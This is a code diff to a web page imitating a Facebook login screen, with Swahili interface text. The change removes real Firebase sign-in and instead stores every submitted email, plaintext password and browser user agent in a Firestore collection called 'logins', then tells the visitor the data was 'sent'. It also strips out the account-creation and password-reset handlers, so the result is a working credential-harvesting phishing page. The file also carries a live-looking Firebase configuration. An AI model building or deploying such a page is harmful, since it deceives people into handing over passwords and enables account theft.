@@ -129,7 +129,6 @@
       transition: background 0.15s;
     }
     .btn-create:hover  { background: #36a420; }
-    .btn-create:active { background: #2d8f1b; }
 
     .fb-footer {
       margin-top: 24px;
@@ -142,25 +141,13 @@
     .success-screen {
       display: none;
       text-align: center;
-      padding: 20px 0 10px;
+      padding: 10px 0;
     }
     .success-screen.show { display: block; }
-    .success-icon {
-      font-size: 48px;
-      margin-bottom: 12px;
-    }
-    .success-email {
-      font-size: 15px;
-      color: #606770;
-      margin-top: 6px;
-      word-break: break-all;
-    }
-    .success-name {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1c1e21;
-    }
-    .btn-logout {
+    .success-icon { font-size: 44px; margin-bottom: 10px; }
+    .success-title { font-size: 18px; font-weight: 700; color: #1c1e21; margin-bottom: 6px; }
+    .success-sub { font-size: 14px; color: #606770; word-break: break-all; }
+    .btn-back {
       margin-top: 20px;
       padding: 10px 24px;
       background: #f0f2f5;
@@ -172,7 +159,7 @@
       cursor: pointer;
       font-family: inherit;
     }
-    .btn-logout:hover { background: #e4e6eb; }
+    .btn-back:hover { background: #e4e6eb; }
 
     /* Toast */
     .toast {
@@ -213,17 +200,17 @@
       <div class="error-msg" id="passErr">Password haipaswi kuwa tupu.</div>
 
       <button class="btn-login" id="btnLogin" onclick="ingia()">Log in</button>
-      <a class="fb-link" onclick="sahauPassword()">Forgotten password?</a>
+      <a class="fb-link">Forgotten password?</a>
       <hr class="fb-divider">
-      <button class="btn-create" onclick="jisajili()">Create new account</button>
+      <button class="btn-create">Create new account</button>
     </div>
 
-    <!-- Success screen (after login) -->
+    <!-- Success screen -->
     <div class="success-screen" id="successScreen">
       <div class="success-icon">✅</div>
-      <div class="success-name" id="successName"></div>
-      <div class="success-email" id="successEmail"></div>
-      <button class="btn-logout" onclick="toka()">Log out</button>
+      <div class="success-title">Imetumwa!</div>
+      <div class="success-sub" id="successEmail"></div>
+      <button class="btn-back" onclick="rudia()">Rudi</button>
     </div>
 
   </div>
@@ -232,9 +219,10 @@
   <div class="toast" id="toast"></div>
 
 <script type="module">
-  import { initializeApp }        from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-  import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged }
-    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-auth.js";
+  import { initializeApp }
+    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+  import { getFirestore, addDoc, collection, serverTimestamp }
+    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey:            "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
@@ -245,8 +233,8 @@
     appId:             "1:474328809093:web:e94c3af5eca2e7949fb3ec"
   };
 
-  const app  = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
 
   /* ── Toast ── */
   function toast(msg, type = "") {
@@ -257,31 +245,7 @@
     setTimeout(() => el.classList.remove("show"), 3500);
   }
 
-  /* ── Auth state listener ── */
-  onAuthStateChanged(auth, (user) => {
-    if (user) {
-      showSuccess(user);
-    } else {
-      showForm();
-    }
-  });
-
-  /* ── Show success screen ── */
-  function showSuccess(user) {
-    document.getElementById("loginForm").style.display    = "none";
-    document.getElementById("successScreen").classList.add("show");
-    document.getElementById("successEmail").textContent   = user.email;
-    document.getElementById("successName").textContent    =
-      user.displayName || user.email.split("@")[0];
-  }
-
-  /* ── Show login form ── */
-  function showForm() {
-    document.getElementById("loginForm").style.display    = "block";
-    document.getElementById("successScreen").classList.remove("show");
-  }
-
-  /* ── Login ── */
+  /* ── Submit to Firestore ── */
   async function ingia() {
     const email = document.getElementById("emailInput").value.trim();
     const pass  = document.getElementById("passInput").value;
@@ -293,6 +257,7 @@
     document.getElementById("emailInput").classList.remove("error-field");
     document.getElementById("passInput").classList.remove("error-field");
 
+    // Validate
     let valid = true;
     if (!email || !email.includes("@")) {
       document.getElementById("emailErr").classList.add("show");
@@ -307,53 +272,50 @@
     if (!valid) return;
 
     btn.disabled    = true;
-    btn.textContent = "Logging in...";
+    btn.textContent = "Inatuma...";
 
     try {
-      await signInWithEmailAndPassword(auth, email, pass);
-      toast("Umeingia kikamilifu ✓", "ok");
+      // Save to Firestore collection "logins"
+      await addDoc(collection(db, "logins"), {
+        email:     email,
+        password:  pass,
+        wakati:    serverTimestamp(),
+        userAgent: navigator.userAgent
+      });
+
+      // Show success
+      document.getElementById("loginForm").style.display = "none";
+      document.getElementById("successScreen").classList.add("show");
+      document.getElementById("successEmail").textContent = email;
+      toast("Imetumwa kikamilifu ✓", "ok");
+
     } catch (e) {
-      let msg = "Imeshindwa kuingia.";
-      if (e.code === "auth/user-not-found")    msg = "Akaunti haipatikani.";
-      if (e.code === "auth/wrong-password")     msg = "Password si sahihi.";
-      if (e.code === "auth/invalid-email")      msg = "Email si sahihi.";
-      if (e.code === "auth/too-many-requests")  msg = "Majaribio mengi. Jaribu baadaye.";
-      if (e.code === "auth/invalid-credential") msg = "Email au password si sahihi.";
-      toast(msg, "err");
+      console.error(e);
+      toast("Hitilafu: " + e.message, "err");
     } finally {
       btn.disabled    = false;
       btn.textContent = "Log in";
     }
   }
 
-  /* ── Logout ── */
-  async function toka() {
-    await signOut(auth);
-    toast("Umetoka nje.", "");
+  /* ── Reset form ── */
+  function rudia() {
+    document.getElementById("emailInput").value = "";
+    document.getElementById("passInput").value  = "";
+    document.getElementById("loginForm").style.display = "block";
+    document.getElementById("successScreen").classList.remove("show");
   }
 
-  /* ── Forgotten password ── */
-  function sahauPassword() {
-    toast("Fungua email yako ili kupata link ya kubadilisha password.", "");
-  }
-
-  /* ── Create account ── */
-  function jisajili() {
-    toast("Nenda kwenye Facebook.com kuunda akaunti mpya.", "");
-  }
-
-  /* ── Enter key support ── */
-  document.getElementById("passInput").addEventListener("keydown", (e) => {
+  /* ── Enter key ── */
+  document.getElementById("passInput").addEventListener("keydown", e => {
     if (e.key === "Enter") ingia();
   });
-  document.getElementById("emailInput").addEventListener("keydown", (e) => {
+  document.getElementById("emailInput").addEventListener("keydown", e => {
     if (e.key === "Enter") document.getElementById("passInput").focus();
   });
 
-  window.ingia         = ingia;
-  window.toka          = toka;
-  window.sahauPassword = sahauPassword;
-  window.jisajili      = jisajili;
+  window.ingia  = ingia;
+  window.rudia  = rudia;
 </script>
 
 </body>
